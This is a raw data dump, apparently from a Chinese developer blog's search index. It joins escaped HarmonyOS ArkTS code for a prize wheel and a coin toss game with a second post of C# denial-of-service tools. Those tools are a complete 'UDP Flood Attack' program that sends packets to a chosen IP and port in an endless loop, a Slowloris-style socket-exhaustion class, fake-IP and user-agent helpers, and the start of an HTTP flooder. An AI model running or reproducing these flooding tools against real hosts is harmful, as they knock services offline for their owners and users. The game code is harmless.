.textAlign(TextAlign.Center)// 设置文本对齐方式 .margin({ left: `${(15 + item) * UNIT_LENGTH * 2}lpx` }); // 设置左边距 }); // 小球 Text() .width(14)// 设置宽度 .height(14)// 设置高度 .backgroundColor(\u0026#34;#ff5841\u0026#34;)// 设置背景颜色 .borderRadius(\u0026#39;50%\u0026#39;); // 设置圆角 // 小球背景 Stack() { Stack() { } .radialGradient({ center: [20, 20], // 设置渐变中心点 radius: 60, // 设置渐变半径 colors: [ [\u0026#34;#807a7a83\u0026#34;, 0.0], // 渐变颜色1 [\u0026#34;#8074747e\u0026#34;, 0.7], // 渐变颜色2 [\u0026#34;#80898992\u0026#34;, 1.0]// 渐变颜色3 ] }).width(\u0026#39;100%\u0026#39;).height(\u0026#39;100%\u0026#39;) // 设置宽度和高度 } .clip(true) // 设置裁剪 .radialGradient({ center: [20, 20], // 设置渐变中心点 radius: 60, // 设置渐变半径 colors: Math.floor(this.angle) === 0 ? [[\u0026#34;#FF6B6B\u0026#34;, 0.0], [\u0026#34;#D84315\u0026#34;, 0.3], [\u0026#34;#C62828\u0026#34;, 1.0]] : // 当角度为0时的渐变颜色 [[\u0026#34;#bcbcc6\u0026#34;, 0.0], [\u0026#34;#464650\u0026#34;, 0.3], [\u0026#34;#474750\u0026#34;, 1.0]] // 当角度不为0时的渐变颜色 }) .width(50) // 设置宽度 .height(50) // 设置高度 .borderRadius(\u0026#39;50%\u0026#39;) // 设置圆角 .translate({ x: `${this.calculateBallPosition().x}lpx`, // 设置X轴偏移 y: `${this.calculateBallPosition().y}lpx` // 设置Y轴偏移 }) .animation({ curve: Curve.EaseOut }); // 设置动画效果 }.width(\u0026#39;580lpx\u0026#39;).height(\u0026#39;580lpx\u0026#39;).borderRadius(\u0026#39;50%\u0026#39;) // 设置外部大圆的宽度、高度和圆角 }.height(\u0026#39;100%\u0026#39;) // 设置Stack的高度 .width(\u0026#39;100%\u0026#39;) // 设置Stack的宽度 .backgroundColor(\u0026#34;#18181a\u0026#34;); // 设置背景颜色 } } turntable 转盘\nimport { CounterComponent, CounterType } from \u0026#39;@kit.ArkUI\u0026#39;; // 导入计数器组件和计数器类型 // 定义扇形组件 @Component struct Sector { @Prop radius: number; // 扇形的半径 @Prop angle: number; // 扇形的角度 @Prop color: string; // 扇形的颜色 // 创建扇形路径的函数 createSectorPath(radius: number, angle: number): string { const centerX = radius / 2; // 计算扇形中心的X坐标 const centerY = radius / 2; // 计算扇形中心的Y坐标 const startX = centerX; // 扇形起始点的X坐标 const startY = centerY - radius; // 扇形起始点的Y坐标 const halfAngle = angle / 4; // 计算半个角度 // 计算扇形结束点1的坐标 const endX1 = centerX + radius * Math.cos((halfAngle * Math.PI) / 180); const endY1 = centerY - radius * Math.sin((halfAngle * Math.PI) / 180); // 计算扇形结束点2的坐标 const endX2 = centerX + radius * Math.cos((-halfAngle * Math.PI) / 180); const endY2 = centerY - radius * Math.sin((-halfAngle * Math.PI) / 180); // 判断是否为大弧 const largeArcFlag = angle / 2 \u0026gt; 180 ? 1 : 0; const sweepFlag = 1; // 设置弧线方向为顺时针 // 生成SVG路径命令 const pathCommands = `M${startX} ${startY} A${radius} ${radius} 0 ${largeArcFlag} ${sweepFlag} ${endX1} ${endY1} L${centerX} ${centerY} L${endX2} ${endY2} A${radius} ${radius} 0 ${largeArcFlag} ${1 - sweepFlag} ${startX} ${startY} Z`; return pathCommands; // 返回路径命令 } // 构建扇形组件 build() { Stack() { // 创建第一个扇形路径 Path() .width(`${this.radius}px`) // 设置宽度为半径 .height(`${this.radius}px`) // 设置高度为半径 .commands(this.createSectorPath(this.radius, this.angle)) // 设置路径命令 .fillOpacity(1) // 设置填充透明度 .fill(this.color) // 设置填充颜色 .strokeWidth(0) // 设置边框宽度为0 .rotate({ angle: this.angle / 4 - 90 }); // 旋转扇形 // 创建第二个扇形路径 Path() .width(`${this.radius}px`) // 设置宽度为半径 .height(`${this.radius}px`) // 设置高度为半径 .commands(this.createSectorPath(this.radius, this.angle)) // 设置路径命令 .fillOpacity(1) // 设置填充透明度 .fill(this.color) // 设置填充颜色 .strokeWidth(0) // 设置边框宽度为0 .rotate({ angle: 180 - (this.angle / 4 - 90) }); // 旋转扇形 } } } // 定义单元格类 @ObservedV2 class Cell { @Trace angle: number = 0; // 扇形的角度 @Trace title: string; // 当前格子的标题 @Trace color: string; // 背景颜色 @Trace rotate: number = 0; // 在转盘要旋转的角度 angleStart: number = 0; // 轮盘所在区间的起始 angleEnd: number = 0; // 轮盘所在区间的结束 proportion: number = 0; // 所占比例 // 构造函数 constructor(proportion: number, title: string, color: string) { this.proportion = proportion; // 设置比例 this.title = title; // 设置标题 this.color = color; // 设置颜色 } } // 定义转盘组件 @Entry @Component struct Wheel { @State cells: Cell[] = []; // 存储单元格的数组 @State wheelWidth: number = 600; // 转盘的宽度 @State currentAngle: number = 0; // 当前转盘的角度 @State selectedName: string = \u0026#34;\u0026#34;; // 选中的名称 isAnimating: boolean = false; // 动画状态 colorIndex: number = 0; // 颜色索引 colorPalette: string[] = [ // 颜色调色板 \u0026#34;#26c2ff\u0026#34;, \u0026#34;#978efe\u0026#34;, \u0026#34;#c389fe\u0026#34;, \u0026#34;#ff85bd\u0026#34;, \u0026#34;#ff7051\u0026#34;, \u0026#34;#fea800\u0026#34;, \u0026#34;#ffcf18\u0026#34;, \u0026#34;#a9c92a\u0026#34; ]; // 组件即将出现时调用 aboutToAppear(): void { // 初始化单元格 this.cells.push(new Cell(1, \u0026#34;跑步\u0026#34;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(2, \u0026#34;跳绳\u0026#34;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(1, \u0026#34;唱歌\u0026#34;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(4, \u0026#34;跳舞\u0026#34;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.calculateAngles(); // 计算角度 } // 计算每个单元格的角度 private calculateAngles() { // 根据比例计算总比例 const totalProportion = this.cells.reduce((sum, cell) =\u0026gt; sum + cell.proportion, 0); this.cells.forEach(cell =\u0026gt; { cell.angle = (cell.proportion * 360) / totalProportion; // 计算每个单元格的角度 }); let cumulativeAngle = 0; // 累计角度 this.cells.forEach(cell =\u0026gt; { cell.angleStart = cumulativeAngle; // 设置起始角度 cumulativeAngle += cell.angle; // 更新累计角度 cell.angleEnd = cumulativeAngle; // 设置结束角度 cell.rotate = cumulativeAngle - (cell.angle / 2); // 计算旋转角度 }); } // 构建转盘组件 build() { Column() { Row() { Text(\u0026#39;转盘\u0026#39;).fontSize(20).fontColor(\u0026#34;#0b0e15\u0026#34;); // 显示转盘标题 }.width(\u0026#39;100%\u0026#39;).height(44).justifyContent(FlexAlign.Center); // 设置行的宽度和高度 // 显示当前状态 Text(this.isAnimating ? \u0026#39;旋转中\u0026#39; : `${this.selectedName}`).fontSize(20).fontColor(\u0026#34;#0b0e15\u0026#34;).height(40); Stack() { Stack() { // 遍历每个单元格并绘制扇形 ForEach(this.cells, (cell: Cell) =\u0026gt; { Stack() { Sector({ radius: lpx2px(this.wheelWidth) / 2, angle: cell.angle, color: cell.color }); // 创建扇形 Text(cell.title).fontColor(Color.White).margin({ bottom: `${this.wheelWidth / 1.4}lpx` }); // 显示单元格标题 }.width(\u0026#39;100%\u0026#39;).height(\u0026#39;100%\u0026#39;).rotate({ angle: cell.rotate }); // 设置宽度和高度，并旋转 }); } .borderRadius(\u0026#39;50%\u0026#39;) // 设置圆角 .backgroundColor(Color.Gray) // 设置背景颜色 .width(`${this.wheelWidth}lpx`) // 设置转盘宽度 .height(`${this.wheelWidth}lpx`) // 设置转盘高度 .rotate({ angle: this.currentAngle }); // 旋转转盘 // 创建指针 Polygon({ width: 20, height: 10 }) .points([[0, 0], [10, -20], [20, 0]]) // 设置指针的点 .fill(\u0026#34;#d72b0b\u0026#34;) // 设置指针颜色 .height(20) // 设置指针高度 .margin({ bottom: \u0026#39;140lpx\u0026#39; }); // 设置指针底部边距 // 创建开始按钮 Button(\u0026#39;开始\u0026#39;) .fontColor(\u0026#34;#c53a2c\u0026#34;) // 设置按钮字体颜色 .borderWidth(10) // 设置按钮边框宽度 .borderColor(\u0026#34;#dd2218\u0026#34;) // 设置按钮边框颜色 .backgroundColor(\u0026#34;#fde427\u0026#34;) // 设置按钮背景颜色 .width(\u0026#39;200lpx\u0026#39;) // 设置按钮宽度 .height(\u0026#39;200lpx\u0026#39;) // 设置按钮高度 .borderRadius(\u0026#39;50%\u0026#39;) // 设置按钮为圆形 .clickEffect({ level: ClickEffectLevel.LIGHT }) // 设置点击效果 .onClick(() =\u0026gt; { // 点击按钮时的回调函数 if (this.isAnimating) { // 如果正在动画中，返回 return; } this.selectedName = \u0026#34;\u0026#34;; // 清空选中的名称 this.isAnimating = true; // 设置动画状态为正在动画 animateTo({ // 开始动画 duration: 5000, // 动画持续时间为5000毫秒 curve: Curve.EaseInOut, // 动画曲线为缓入缓出 onFinish: () =\u0026gt; { // 动画完成后的回调 this.currentAngle %= 360; // 保持当前角度在0到360之间 for (const cell of this.cells) { // 遍历每个单元格 // 检查当前角度是否在单元格的角度范围内 if (360 - this.currentAngle \u0026gt;= cell.angleStart \u0026amp;\u0026amp; 360 - this.currentAngle \u0026lt;= cell.angleEnd) { this.selectedName = cell.title; // 设置选中的名称为当前单元格的标题 break; // 找到后退出循环 } } this.isAnimating = false; // 设置动画状态为未动画 }, }, () =\u0026gt; { // 动画进行中的回调 this.currentAngle += (360 * 5 + Math.floor(Math.random() * 360)); // 更新当前角度，增加随机旋转 }); }); } // 创建滚动区域 Scroll() { Column() { // 遍历每个单元格，创建输入框和计数器 ForEach(this.cells, (item: Cell, index: number) =\u0026gt; { Row() { // 创建文本输入框，显示单元格标题 TextInput({ text: item.title }) .layoutWeight(1) // 设置输入框占据剩余空间 .onChange((value) =\u0026gt; { // 输入框内容变化时的回调 item.title = value; // 更新单元格标题 }); // 创建计数器组件 CounterComponent({ options: { type: CounterType.COMPACT, // 设置计数器类型为紧凑型 numberOptions: { label: `当前占比`, // 设置计数器标签 value: item.proportion, // 设置计数器初始值 min: 1, // 设置最小值 max: 100, // 设置最大值 step: 1, // 设置步长 onChange: (value: number) =\u0026gt; { // 计数器值变化时的回调 item.proportion = value; // 更新单元格的比例 this.calculateAngles(); // 重新计算角度 } } } }); // 创建删除按钮 Button(\u0026#39;删除\u0026#39;).onClick(() =\u0026gt; { this.cells.splice(index, 1); // 从单元格数组中删除当前单元格 this.calculateAngles(); // 重新计算角度 }); }.width(\u0026#39;100%\u0026#39;).justifyContent(FlexAlign.SpaceBetween) // 设置行的宽度和内容对齐方式 .padding({ left: 40, right: 40 }); // 设置左右内边距 }); }.layoutWeight(1); // 设置滚动区域占据剩余空间 }.layoutWeight(1) // 设置滚动区域占据剩余空间 .margin({ top: 20, bottom: 20 }) // 设置上下外边距 .align(Alignment.Top); // 设置对齐方式为顶部对齐 // 创建添加新内容按钮 Button(\u0026#39;添加新内容\u0026#39;).onClick(() =\u0026gt; { // 向单元格数组中添加新单元格 this.cells.push(new Cell(1, \u0026#34;新内容\u0026#34;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.calculateAngles(); // 重新计算角度 }).margin({ top: 20, bottom: 20 }); // 设置按钮的上下外边距 } .height(\u0026#39;100%\u0026#39;) // 设置组件高度为100% .width(\u0026#39;100%\u0026#39;) // 设置组件宽度为100% .backgroundColor(\u0026#34;#f5f8ff\u0026#34;); // 设置组件背景颜色 } } Coin 投硬币\n// 定义地鼠组件 @Component struct Hamster { @Prop cellWidth: number // 单元格宽度 build() { Stack() { // 创建一个堆叠布局 // 身体 Text() .width(`${this.cellWidth / 2}lpx`)// 宽度为单元格宽度的一半 .height(`${this.cellWidth / 3 * 2}lpx`)// 高度为单元格高度的2/3 .backgroundColor(\u0026#34;#b49579\u0026#34;)// 背景颜色 .borderRadius({ topLeft: \u0026#39;50%\u0026#39;, topRight: \u0026#39;50%\u0026#39; })// 圆角 .borderColor(\u0026#34;#2a272d\u0026#34;)// 边框颜色 .borderWidth(1) // 边框宽度 // 嘴巴 Ellipse() .width(`${this.cellWidth / 4}lpx`)// 嘴巴的宽度 .height(`${this.cellWidth / 5}lpx`)// 嘴巴的高度 .fillOpacity(1)// 填充不透明度 .fill(\u0026#34;#e7bad7\u0026#34;)// 填充颜色 .stroke(\u0026#34;#563e3f\u0026#34;)// 边框颜色 .strokeWidth(1)// 边框宽度 .margin({ top: `${this.cellWidth / 6}lpx` }) // 上边距 // 左眼睛 Ellipse() .width(`${this.cellWidth / 9}lpx`)// 左眼睛的宽度 .height(`${this.cellWidth / 6}lpx`)// 左眼睛的高度 .fillOpacity(1)// 填充不透明度 .fill(\u0026#34;#313028\u0026#34;)// 填充颜色 .stroke(\u0026#34;#2e2018\u0026#34;)// 边框颜色 .strokeWidth(1)// 边框宽度 .margin({ bottom: `${this.cellWidth / 3}lpx`, right: `${this.cellWidth / 6}lpx` }) // 下边距和右边距 // 右眼睛 Ellipse() .width(`${this.cellWidth / 9}lpx`)// 右眼睛的宽度 .height(`${this.cellWidth / 6}lpx`)// 右眼睛的高度 .fillOpacity(1)// 填充不透明度 .fill(\u0026#34;#313028\u0026#34;)// 填充颜色 .stroke(\u0026#34;#2e2018\u0026#34;)// 边框颜色 .strokeWidth(1)// 边框宽度 .margin({ bottom: `${this.cellWidth / 3}lpx`, left: `${this.cellWidth / 6}lpx` }) // 下边距和左边距 // 左眼瞳 Ellipse() .width(`${this.cellWidth / 20}lpx`)// 左眼瞳的宽度 .height(`${this.cellWidth / 15}lpx`)// 左眼瞳的高度 .fillOpacity(1)// 填充不透明度 .fill(\u0026#34;#fefbfa\u0026#34;)// 填充颜色 .margin({ bottom: `${this.cellWidth / 2.5}lpx`, right: `${this.cellWidth / 6}lpx` }) // 下边距和右边距 // 右眼瞳 Ellipse() .width(`${this.cellWidth / 20}lpx`)// 右眼瞳的宽度 .height(`${this.cellWidth / 15}lpx`)// 右眼瞳的高度 .fillOpacity(1)// 填充不透明度 .fill(\u0026#34;#fefbfa\u0026#34;)// 填充颜色 .margin({ bottom: `${this.cellWidth / 2.5}lpx`, left: `${this.cellWidth / 6}lpx` }) // 下边距和左边距 }.width(`${this.cellWidth}lpx`).height(`${this.cellWidth}lpx`) // 设置组件的宽度和高度 } } // 定义页面组件 @Entry @Component struct CoinTossPage { @State cellWidth: number = 50 // 单元格宽度 @State headsCount: number = 0 // 正面朝上的次数 @State tailsCount: number = 0 // 反面朝上的次数 @State rotationAngle: number = 0 // 旋转角度 @State verticalOffset: number = 0 // 纵向位移 @State isAnimRun: boolean = false // 动画是否正在执行 build() { Column() { // 页面标题 Text(\u0026#39;抛硬币\u0026#39;) .height(50)// 高度设置为50 .width(\u0026#39;100%\u0026#39;)// 宽度设置为100% .textAlign(TextAlign.Center)// 文本居中对齐 .fontColor(\u0026#34;#fefefe\u0026#34;)// 字体颜色 .fontSize(20); // 字体大小 // 显示地鼠和计数 Row({ space: 20 }) { Stack() { Hamster({ cellWidth: this.cellWidth }) // 创建地鼠组件 } .borderRadius(\u0026#39;50%\u0026#39;) // 设置圆角 .width(`${this.cellWidth}lpx`) // 设置宽度 .height(`${this.cellWidth}lpx`) // 设置高度 .linearGradient({ // 设置线性渐变背景 direction: GradientDirection.LeftBottom, colors: [[\u0026#39;#ebcf2f\u0026#39;, 0.0], [\u0026#39;#fef888\u0026#39;, 0.5], [\u0026#39;#ebcf2f\u0026#39;, 1.0]] }); // 显示反面朝上的次数 Text(`${this.tailsCount}`) .fontSize(20) .fontColor(\u0026#34;#fefefe\u0026#34;); Stack() { // 显示100 Text(\u0026#34;100\u0026#34;) .fontColor(\u0026#34;#9f7606\u0026#34;) .fontSize(`${this.cellWidth / 2}lpx`); } .borderRadius(\u0026#39;50%\u0026#39;) // 设置圆角 .width(`${this.cellWidth}lpx`) // 设置宽度 .height(`${this.cellWidth}lpx`) // 设置高度 .linearGradient({ // 设置线性渐变背景 direction: GradientDirection.LeftBottom, colors: [[\u0026#39;#ebcf2f\u0026#39;, 0.0], [\u0026#39;#fef888\u0026#39;, 0.5], [\u0026#39;#ebcf2f\u0026#39;, 1.0]] }); // 显示正面朝上的次数 Text(`${this.headsCount}`) .fontSize(20) .fontColor(\u0026#34;#fefefe\u0026#34;); }.width(\u0026#39;100%\u0026#39;).justifyContent(FlexAlign.Center); // 设置宽度和内容居中对齐 Stack() { Stack() { // 创建放大版地鼠组件 Hamster({ cellWidth: this.cellWidth * 3 }) .visibility(this.isHeadsFaceUp() ? Visibility.Visible : Visibility.Hidden); // 根据状态显示或隐藏 // 显示100 Text(\u0026#34;100\u0026#34;) .fontColor(\u0026#34;#9f7606\u0026#34;)// 字体颜色 .fontSize(`${this.cellWidth / 2 * 3}lpx`)// 字体大小 .visibility(!this.isHeadsFaceUp() ? Visibility.Visible : Visibility.Hidden)// 根据状态显示或隐藏 .rotate({ // 旋转180度 x: 1, y: 0, z: 0, angle: 180 }); } .borderRadius(\u0026#39;50%\u0026#39;) // 设置圆角 .width(`${this.cellWidth * 3}lpx`) // 设置宽度 .height(`${this.cellWidth * 3}lpx`) // 设置高度 .linearGradient({ // 设置线性渐变背景 direction: GradientDirection.LeftBottom, colors: [[\u0026#39;#ebcf2f\u0026#39;, 0.0], [\u0026#39;#fef888\u0026#39;, 0.5], [\u0026#39;#ebcf2f\u0026#39;, 1.0]] }) .rotate({ // 根据当前角度旋转 x: 1, y: 0, z: 0, angle: this.rotationAngle }) .translate({ x: 0, y: this.verticalOffset }) // 设置纵向位移 .onClick(() =\u0026gt; { // 点击事件处理 if (this.isAnimRun) { return; } this.isAnimRun = true let maxAnimationSteps = 2 * (10 + Math.floor(Math.random() * 10)); // 计算最大动画次数 let totalAnimationDuration = 2000; // 动画总时长 // 第一次动画，向上抛出 animateToImmediately({ duration: totalAnimationDuration / 2, // 动画时长为总时长的一半 onFinish: () =\u0026gt; { // 动画完成后的回调 // 第二次动画，向下落 animateToImmediately({ duration: totalAnimationDuration / 2, onFinish: () =\u0026gt; { this.rotationAngle = this.rotationAngle % 360; // 确保角度在0到360之间 // 判断当前显示的面 if (this.isHeadsFaceUp()) { // 如果是地鼠面 this.tailsCount++; // 反面朝上的次数加1 } else { // 如果是反面 this.headsCount++; // 正面朝上的次数加1 } this.isAnimRun = false } }, () =\u0026gt; { this.verticalOffset = 0; // 重置纵向位移 }); } }, () =\u0026gt; { // 设置纵向位移，模拟抛硬币的效果 this.verticalOffset = -100 * (1 + Math.floor(Math.random() * 5)); // 随机设置向上的位移 }); // 循环动画，增加旋转效果 for (let i = 0; i \u0026lt; maxAnimationSteps; i++) { animateToImmediately({ delay: i * totalAnimationDuration / maxAnimationSteps, // 设置每次动画的延迟 duration: 100, // 每次动画的持续时间 onFinish: () =\u0026gt; { // 动画完成后的回调 } }, () =\u0026gt; { this.rotationAngle += 90; // 每次增加90度旋转 }); } }); }.width(\u0026#39;100%\u0026#39;).layoutWeight(1).align(Alignment.Bottom).padding({ bottom: 80 }); // 设置组件的宽度、权重、对齐方式和底部内边距 } .height(\u0026#39;100%\u0026#39;) // 设置整个页面的高度 .width(\u0026#39;100%\u0026#39;) // 设置整个页面的宽度 .backgroundColor(\u0026#34;#0b0d0c\u0026#34;); // 设置背景颜色 } // 判断当前是否显示地鼠面 isHeadsFaceUp() { let normalizedAngle = this.rotationAngle % 360; // 规范化角度 // 判断角度范围，确定是否显示地鼠面 if (normalizedAngle \u0026gt;= 0 \u0026amp;\u0026amp; normalizedAngle \u0026lt; 90 || normalizedAngle \u0026gt;= 270 \u0026amp;\u0026amp; normalizedAngle \u0026lt;= 360) { return true; // 显示地鼠面 } return false; // 显示反面 } } ","permalink":"https://qfsyso.github.io/posts/harmonyos-next-waste-sorting/","summary":"环境 DevEco Studio NEXT Beta1 Build Version: 5.0 API 13\nWaste Sorting 垃圾分类\n算法 //springCurve回弹 animateToImmediately({ duration:800, curve: curves.springCurve(0, 20, 90, 20), // 其他配置 }); 初始偏移量、振幅、周期和阻尼系数，通过这些参数可以控制动画的弹性效果\n//Fisher-Yates洗牌 shuffleItems() { for (let i = this.garbageItems.length - 1; i \u0026gt; 0; i--) { const j = Math.floor(Math.random() * (i + 1)); let temp = this.garbageItems[i]; this.garbageItems[i] = this.garbageItems[j]; this.garbageItems[j] = temp; } } 代码 import { curves } from \u0026#39;@kit.ArkUI\u0026#39;; // 导入ArkUI工具包中的曲线模块 // 定义垃圾项目类 class GarbageItem { name: string; // 垃圾名称 type: number; // 垃圾类型 description?","title":"HarmonyOS Next Waste Sorting"},{"content":"UDP 包发 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class Program { static void Main(string[] args) { Console.Clear(); Console.WriteLine(\u0026#34;UDP Flood Attack\u0026#34;); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write(\u0026#34;IP Target : \u0026#34;); string ip = Console.ReadLine(); Console.Write(\u0026#34;Port : \u0026#34;); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine(\u0026#34;Attack Starting\u0026#34;); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) { try { udpClient.Send(bytes, bytes.Length, ip, port); sent++; Console.WriteLine($\u0026#34;Sent {sent} packets to {ip} through port: {port}\u0026#34;); // 增加端口号 port++; if (port \u0026gt; 65534) { port = 1; } } catch (Exception ex) { Console.WriteLine($\u0026#34;Error: {ex.Message}\u0026#34;); break; } } } static void ShowProgressBar() { int[] delays = { 5, 5, 5, 5 }; string[] progress = { \u0026#34;[ ] 0% \u0026#34;, \u0026#34;[===== ] 25%\u0026#34;, \u0026#34;[========== ] 50%\u0026#34;, \u0026#34;[=============== ] 75%\u0026#34;, \u0026#34;[====================] 100%\u0026#34; }; for (int i = 0; i \u0026lt; progress.Length; i++) { Console.WriteLine(progress[i]); if (i \u0026lt; delays.Length) { Thread.Sleep(delays[i] * 1000); // 模拟延迟 } } } } UDP 数据包发送：\n使用 C# 的 UdpClient 类发送 UDP 数据包。 数据包内容为随机字节，通过 Random.NextBytes() 填充。 进度条显示： 模拟了攻击启动的加载进度，类似原始 Python 代码中的进度条。\n端口递增逻辑： 每次发送数据包后，端口号加 1。 超过 65534 时，重置为 1。\n参考： https://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py\nTCP 工具类 namespace ConsoleApp1Test { /// \u0026lt;summary\u0026gt; /// dstools /// \u0026lt;/summary\u0026gt; internal class ds { public static List\u0026lt;string\u0026gt; AddBots() { List\u0026lt;string\u0026gt; bots = new List\u0026lt;string\u0026gt;(); bots.Add(\u0026#34;http://www.bing.com/search?q=%40\u0026amp;count=50\u0026amp;first=0\u0026#34;); bots.Add(\u0026#34;http://www.google.com/search?hl=en\u0026amp;num=100\u0026amp;q=intext%3A%40\u0026amp;ie=utf-8\u0026#34;); return bots; } public static List\u0026lt;string\u0026gt; AddUserAgent() { List\u0026lt;string\u0026gt; uagents = new List\u0026lt;string\u0026gt;(); try { string[] lines = [\u0026#34;Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0\u0026#34;]; //System.IO.File.ReadAllLines(\u0026#34;ua.txt\u0026#34;); uagents.AddRange(lines); } catch (FileNotFoundException) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine(\u0026#34;[-] No file named \u0026#39;ua.txt\u0026#39;,failed to load User-Agents\u0026#34;); Console.ResetColor(); } return uagents; } public static IPAddress CheckTgt(string tgt) { try { IPHostEntry hostEntry = Dns.GetHostEntry(tgt); return hostEntry.AddressList[0]; } catch (Exception) { Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($\u0026#34;[-] Can\u0026#39;t resolve host:Unknown host!\u0026#34;); Console.ResetColor(); Environment.Exit(1); } return null; } public static string FakeIP() { Random random = new Random(); string[] ips = new string[4]; for (int i = 0; i \u0026lt; 4; i++) { int num = random.Next(0, 256); if (num == 127) { i--; continue; } ips[i] = num.ToString(); } return string.Join(\u0026#34;.\u0026#34;, ips); } } } 网络数据类 namespace ConsoleApp1Test { public class Pyslow { private string tgt; private int port; private float to; private int threads; private int sleep; private string[] method = { \u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34; }; private int pkt_count; public Pyslow(string tgt, int port, float to, int threads, int sleep) { this.tgt = tgt; this.port = port; this.to = to; this.threads = threads; this.sleep = sleep; } public byte[] MyPkt() { Random random = new Random(); string text = method[random.Next(0, method.Length)] + \u0026#34; /\u0026#34; + random.Next(1, 999999999).ToString() + \u0026#34; HTTP/1.1\\r\\n\u0026#34; + \u0026#34;Host:\u0026#34; + tgt + \u0026#34;\\r\\n\u0026#34; + \u0026#34;User-Agent:\u0026#34; +ds. AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)] + \u0026#34;\\r\\n\u0026#34; + \u0026#34;Content-Length: 42\\r\\n\u0026#34;; return Encoding.ASCII.GetBytes(text); } public Socket BuildingSocket() { Socket sock = null; try { sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); pkt_count += 3; if (sock.Connected) { sock.Send(MyPkt()); pkt_count += 1; } } catch (Exception) { sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, -1); pkt_count += 3; if (sock.Connected) { sock.Send(MyPkt()); pkt_count += 1; } } return sock; } public void SendingPackets() { Socket sock = null; try { sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); pkt_count += 3; if (sock.Connected) { byte[] data = Encoding.ASCII.GetBytes(\u0026#34;X-a: b\\r\\n\u0026#34;); sock.Send(data); pkt_count += 1; } } catch (Exception) { sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, -1); if (sock.Connected) { byte[] data = Encoding.ASCII.GetBytes(\u0026#34;X-a: b\\r\\n\u0026#34;); sock.Send(data); pkt_count += 1; } } } public void DoConnection() { int socks = 0; int fail = 0; List\u0026lt;Socket\u0026gt; lsocks = new List\u0026lt;Socket\u0026gt;(); Console.ForegroundColor = ConsoleColor.Blue; Console.WriteLine(\u0026#34;\\t\\tBuilding sockets\u0026#34;); Console.ResetColor(); while (socks \u0026lt; threads) { try { Socket sock = BuildingSocket(); if (sock != null) { lsocks.Add(sock); socks++; if (socks \u0026gt; threads) { break; } } } catch (Exception) { fail++; } } Console.ForegroundColor = ConsoleColor.Blue; Console.WriteLine(\u0026#34;\\t\\tSending packets\u0026#34;); Console.ResetColor(); while (socks \u0026lt; threads) { try { SendingPackets(); socks++; if (socks \u0026gt; threads) { break; } } catch (Exception) { fail++; } } Console.ForegroundColor = ConsoleColor.Green; Console.Write(\u0026#34;I have sent \u0026#34;); Console.ForegroundColor = ConsoleColor.Cyan; Console.Write(pkt_count.ToString()); Console.ForegroundColor = ConsoleColor.Green; Console.Write(\u0026#34; packets successfully.Now i\u0026#39;m going to sleep for \u0026#34;); Console.ForegroundColor = ConsoleColor.Red; Console.Write(sleep.ToString()); Console.ForegroundColor = ConsoleColor.Green; Console.WriteLine(\u0026#34; second\u0026#34;); Thread.Sleep(sleep * 1000); } } } http类 public class Requester { private string tgt; private int port; private bool ssl; private List\u0026lt;HttpWebRequest\u0026gt; req = new List\u0026lt;HttpWebRequest\u0026gt;(); public Requester(string tgt) { this.tgt = tgt; Uri url = new Uri(tgt); if (url.Scheme == \u0026#34;https\u0026#34;) { ssl = true; port = 443; } else { ssl = false; port = 80; } } public Dictionary\u0026lt;string, string\u0026gt; Header2() { Random random = new Random(); List\u0026lt;string\u0026gt; cachetype = new List\u0026lt;string\u0026gt; { \u0026#34;no-cache\u0026#34;, \u0026#34;no-store\u0026#34;, \u0026#34;max-age=\u0026#34; + random.Next(0, 10).ToString(), \u0026#34;max-stale=\u0026#34; + random.Next(0, 100).ToString(), \u0026#34;min-fresh=\u0026#34; + random.Next(0, 10).ToString(), \u0026#34;notransform\u0026#34;, 